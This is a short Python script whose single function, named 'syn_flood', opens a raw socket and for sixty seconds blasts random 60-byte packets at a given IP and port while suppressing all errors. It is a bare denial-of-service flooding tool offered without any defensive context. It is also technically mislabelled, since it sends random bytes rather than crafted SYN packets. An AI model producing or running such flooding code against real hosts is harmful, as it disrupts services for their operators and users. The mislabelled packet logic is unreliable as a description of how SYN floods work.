import socket
import random
import time

def syn_flood(target):
    ip = target.split(":")[0]
    port = int(target.split(":")[1]) if ":" in target else 80
    end = time.time() + 60
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    while time.time() < end:
        try:
            packet = random._urandom(60)
            sock.sendto(packet, (ip, port))
        except:
            pass
